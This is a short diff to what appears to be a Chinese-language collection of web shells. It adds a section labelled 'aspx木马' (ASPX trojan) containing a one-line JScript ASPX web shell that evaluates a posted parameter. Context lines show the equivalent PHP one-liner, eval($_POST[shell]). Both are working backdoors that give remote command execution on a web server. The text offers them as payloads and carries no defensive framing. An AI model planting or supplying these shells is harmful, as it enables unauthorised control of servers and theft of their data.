@@ -37,5 +37,11 @@ $exp = $_POST['shell'];
 ?>    //等同于php一句话<?php eval($_POST[shell]);?>
 ```
 
+aspx木马
+
+```
+<%@ Page Language="Jscript"%><%eval(Request.Item["shell"],"unsafe");%>
+```
+
 
 
